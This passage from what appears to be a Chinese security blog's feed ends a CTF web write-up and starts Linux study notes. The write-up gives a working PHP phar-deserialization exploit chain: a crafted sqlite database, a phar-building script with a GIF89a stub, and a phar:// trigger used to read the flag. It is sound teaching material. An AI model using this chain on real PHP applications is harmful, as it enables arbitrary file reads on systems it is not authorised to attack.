class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>unlink处明显可以打phar反序列化，path 是我们可控的，写入文件的内容也没有限制</p><p>然后看 __set 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span>  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/log/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filePath 可控，可以实现任意文件读取</p><p>那么如何触发 __set 呢？</p><p>本着这种题目给的东西都有利用可能的原则，猜测要在数据库这里做文章</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PDO_connect</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//use to set options of PDO connections</span>    <span class="token keyword">public</span> <span class="token variable">$smt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"dsn"</span><span class="token operator">=></span><span class="token string double-quoted-string">"mysql:host=localhost:3306;dbname=users;charset=utf8"</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'host'</span><span class="token operator">=></span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'port'</span><span class="token operator">=></span><span class="token string single-quoted-string">'3306'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'user'</span><span class="token operator">=></span><span class="token string single-quoted-string">'joker'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'password'</span><span class="token operator">=></span><span class="token string single-quoted-string">'joker'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'charset'</span><span class="token operator">=></span><span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'options'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token operator">=></span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">,</span>                <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span> <span class="token operator">=></span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Connection Error: '</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里专门给了一个 con_options 可控，可以猜测在 options 处入手</p><blockquote><p>通过<code>User::__destruct</code>-&gt;<code>User::log</code> ,User::log 指定查询数据库来源，设定<code>&quot;options&quot;=&gt;[PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_CLASS|PDO::FETCH_CLASSTYPE,]]</code>，使得<strong>查询结果第一列返回结果作为类名实例化</strong>，之后的结果会变成属性名和属性值进行赋值，对于未定义的属性会触发这个类的<code>__set</code>方法。比如说数据库第一行结果为 UserMessage，那么会实例化 UserMessage</p></blockquote><p><a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250131230900317.png" alt="image-20250131230900317"></p><p>所以要构造一个数据库，不出网的情况下当然是要选择 sqlite 这种基于文件的数据库，如果出网也可以直接连到 vps 上的mysql</p><p>使用 python 生成一个</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">def gen_db(db_path):    conn &#x3D; sqlite3.connect(db_path)    cursor &#x3D; conn.cursor()    cursor.execute(&#39;&#39;&#39;    CREATE TABLE IF NOT EXISTS users (        username TEXT NOT NULL,        filePath TEXT NOT NULL,        password TEXT NOT NULL,        id INTEGER PRIMARY KEY AUTOINCREMENT    )    &#39;&#39;&#39;)    users &#x3D; [        (&#39;UserMessage&#39;, &#39;&#x2F;flag&#39;, &#39;&#x2F;flag&#39;),    ]    cursor.executemany(&#39;&#39;&#39;    INSERT INTO users (username, password,filePath) VALUES (?,?,?)    &#39;&#39;&#39;, users)    conn.commit()    cursor.execute(&#39;SELECT * FROM users&#39;)    conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>users 表结构如下：</p><table><thead><tr><th>username</th><th>filePath</th><th>password</th><th>id</th></tr></thead><tbody><tr><td>UserMessage</td><td>&#x2F;flag</td><td>&#x2F;flag</td><td>1</td></tr></tbody></table><p>这样子就会实例化 UserMessage 类，然后 filePath 为 &#x2F;flag，之后的 password 和 id 由于是未定义的变量名会触发 __set，从而读取flag</p><br><p>那么进行实操，base64写入sqlite文件</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202223314903.png" alt="image-20250202223314903"></p><p>然后构造phar包：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">PDO_connect</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//use to set options of PDO connections</span>    <span class="token keyword">public</span> <span class="token variable">$smt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string double-quoted-string">"dsn"</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'sqlite:/var/www/html/txt/06a20bd1595de64a76f6acce257c8bed.txt'</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"password"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"options"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span> <span class="token operator">=></span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token class-name">FETCH_CLASS</span> <span class="token operator">|</span> <span class="token class-name">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_CLASSTYPE</span><span class="token punctuation">,</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO_connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UserMessage"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"aaaaaaaaaaaaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样base64编码传输，注意传 phar 包的 base64 需要再进行一次url编码</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202231613642.png" alt="image-20250202231613642"></p><p>然后 unlink 删除这个文件触发 phar 反序列化，注意删除这里已经补全了 .txt 后缀：<code>phar:///var/www/html/txt/189fbb1b7e7a116f9c06cd8cb4396429</code></p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202231718748.png" alt="image-20250202231718748"></p><p>此时访问 log 下 &#x2F;flag 的md5编码路径就能得到flag了</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250202231805699.png" alt="image-20250202231805699"></p><br><p>好nb的思路，给我两三天我都不一定想得到</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;时隔一年，这次连签到都差点做不来了&lt;/p&gt;
&lt;p&gt;唉唉web又爆零了，埋了，得了一种打 DAS 就做不动题的病&lt;/p&gt;
&lt;p&gt;等期末考完再复现，要被期末考薄纱了😭&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18620905&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18620905&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#&quot;&gt;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/&quot;&gt;https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux从0.5到1</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/</id>
    <published>2024-12-15T17:47:48.000Z</published>
    <updated>2024-12-18T04:03:42.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>期末自查用</p><span id="more"></span><hr><h1 id="VMware配置"><a href="#VMware配置" class="headerlink" title="VMware配置"></a>VMware配置</h1><h2 id="安装RHEL6-3"><a href="#安装RHEL6-3" class="headerlink" title="安装RHEL6.3"></a>安装RHEL6.3</h2><p>虚拟磁盘设置为30G，采用动态分配硬盘方式，并设置为分割多个小文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps1.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps2.jpg" alt="img"></p><p>DVD 导入准备的光盘，使用 ISO 映像文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps3.jpg" alt="img"></p><p>正式进入安装界面</p><p>磁盘分区：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps4.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps5.jpg" alt="img"></p><p>自定义软件安装包</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps8.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps6.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps7.jpg" alt="img"></p><hr><h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>以 NAT 模式为例，这样子主机相当于路由器，给虚拟机分配一层内网地址（桥接模式则会和主机在同一网段分配 ip 地址）</p><p>虚拟机网络设置为 NAT 模式</p><p>主机网络适配器启动 VMnet8  网卡</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101636472.png" alt="image-20241216101636472"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101704214.png" alt="image-20241216101704214"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101801687.png" alt="image-20241216101801687"></p><p>然后保证右下角这个图标处于启动状态</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216102028365.png" alt="image-20241216102028365"></p><p>同时虚拟机内连接网络，这里是 System eth0</p><p>然后主机和虚拟机之间相互ping一下测试网络连通性（主机需关闭防火墙才能被 ping 通）</p><h2 id="ssh远程登录"><a href="#ssh远程登录" class="headerlink" title="ssh远程登录"></a>ssh远程登录</h2><h3 id="启动-ssh-服务"><a href="#启动-ssh-服务" class="headerlink" title="启动 ssh 服务"></a>启动 ssh 服务</h3><p>debian 系</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openssh-server<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> start <span class="token comment"># 启动服务</span><span class="token function">sudo</span> systemctl start <span class="token function">ssh</span> <span class="token comment"># 较新的系统启动服务</span><span class="token function">sudo</span> /etc/init.d/ssh restart <span class="token comment"># 重启服务</span><span class="token comment"># 或</span><span class="token function">sudo</span> systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>centos 系</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> openssh-server<span class="token function">sudo</span> <span class="token function">service</span> sshd start<span class="token comment"># 或</span><span class="token function">sudo</span> systemctl start sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查是否启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span class="token function">netstat</span> <span class="token parameter variable">-an</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="配置-ssh"><a href="#配置-ssh" class="headerlink" title="配置 ssh"></a>配置 ssh</h3><p>允许密码身份验证：编辑 &#x2F;etc&#x2F;ssh&#x2F;ssh_config 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PasswordAuthentication <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>允许root用户登录：编辑 &#x2F;etc&#x2F;ssh&#x2F;ssh_config 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># PermitRootLogin prohibit-password</span>PermitRootLogin <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重新加载ssh配置：重载或重启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl reload <span class="token function">ssh</span><span class="token function">sudo</span> systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="Shell命令行"><a href="#Shell命令行" class="headerlink" title="Shell命令行"></a>Shell命令行</h1><h2 id="虚拟控制台"><a href="#虚拟控制台" class="headerlink" title="虚拟控制台"></a>虚拟控制台</h2><p>除了桌面启动终端窗口，ssh连接终端以外，还可以使用 linux 的虚拟控制台，在 RHEL 6 上对应的设备是 &#x2F;dev&#x2F;tty2、&#x2F;dev&#x2F;tty3、&#x2F;dev&#x2F;tty4、&#x2F;dev&#x2F;tty5、&#x2F;dev&#x2F;tty6</p><p>此种运行等级为 run level 3，纯文本终端 （图形登录环境 tty1 的运行等级为 run level 5）</p><p>使用 ctrl+alt+f2&#x2F;f3&#x2F;f4&#x2F;f5&#x2F;f6 可以切换</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps9.jpg" alt="img"></p><p>alt + f3 可以切换为控制台 tty3</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps10.jpg" alt="img"></p><p>这里登录时间后面显示的是主机地址，如果是远程主机则会显示其 ip</p><p>默认登录运行级别的设置可以修改 &#x2F;etc&#x2F;inittab 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">id:3:initdefault:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Shell-命令提示符"><a href="#Shell-命令提示符" class="headerlink" title="Shell 命令提示符"></a>Shell 命令提示符</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhelserver /etc<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>[]</code>内的内容即为 Shell 提示符：格式<code>用户名@主机名 当前目录</code></p><p><code>~</code>符号是表示<strong>用户主目录的 Shell 变量</strong></p><p>Shell 命令提示符的显示内容可以通过修改 Shell 的环境变量 PS1 来实现</p><hr><h2 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h2><p>记一些之前没怎么用过的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">reboot</span><span class="token comment"># 重启</span><span class="token function">halt</span><span class="token function">shutdown</span><span class="token comment"># 关机</span><span class="token builtin class-name">cd</span><span class="token comment"># 直接切换到用户主目录</span><span class="token builtin class-name">cd</span> -<span class="token comment"># 回到前一次工作目录</span><span class="token function">mkdir</span> <span class="token punctuation">[</span>-p/--parents<span class="token punctuation">]</span> <span class="token punctuation">[</span>目录<span class="token punctuation">]</span><span class="token comment"># -p 建立尚不存在的目录，即多层目录</span><span class="token function">rmdir</span> <span class="token punctuation">[</span>-p<span class="token punctuation">]</span> <span class="token punctuation">[</span>目录<span class="token punctuation">]</span><span class="token function">dmesg</span><span class="token comment"># 查看内核日志</span><span class="token function">ls</span> <span class="token parameter variable">-d</span><span class="token comment"># 显示指定目录的详细信息，不显示子目录及文件</span><span class="token function">ls</span> <span class="token parameter variable">-R</span><span class="token comment"># 递归列出所有子目录下的文件和目录</span><span class="token function">ls</span> <span class="token parameter variable">-i</span><span class="token comment"># 查询inode号</span><span class="token function">tail</span> <span class="token punctuation">[</span>-n<span class="token punctuation">]</span> 文件名<span class="token function">head</span> <span class="token punctuation">[</span>-n<span class="token punctuation">]</span> 文件名<span class="token comment"># 查看某文件的末尾/头几行，-n指定行数，默认10行</span><span class="token function">cut</span> -d<span class="token punctuation">\</span>  <span class="token parameter variable">-f1</span> data.txt<span class="token comment"># -d指定以空格为分隔符，-f指定显示每行分隔出的第一个字段</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216153437229.png" alt="image-20241216153437229"></p><p>使用ls命令查看&#x2F;root&#x2F;lab4&#x2F;file目录下的各个文件的inode编号：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/9.jpg" alt="img"></p><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token punctuation">[</span>-clnvi<span class="token punctuation">]</span> <span class="token operator">&lt;</span>pattern<span class="token operator">></span> <span class="token operator">&lt;</span>files<span class="token operator">></span><span class="token parameter variable">-c</span> <span class="token comment"># 只显示符合字符串模式的总行数</span><span class="token parameter variable">-l</span> <span class="token comment"># 只显示符合字符串模式的文件的文件名</span><span class="token parameter variable">-n</span> <span class="token comment"># 显示匹配行的行号</span><span class="token parameter variable">-v</span> <span class="token comment"># 反选</span><span class="token parameter variable">-i</span> <span class="token comment"># 忽略大小写</span><span aria-hidden="true" 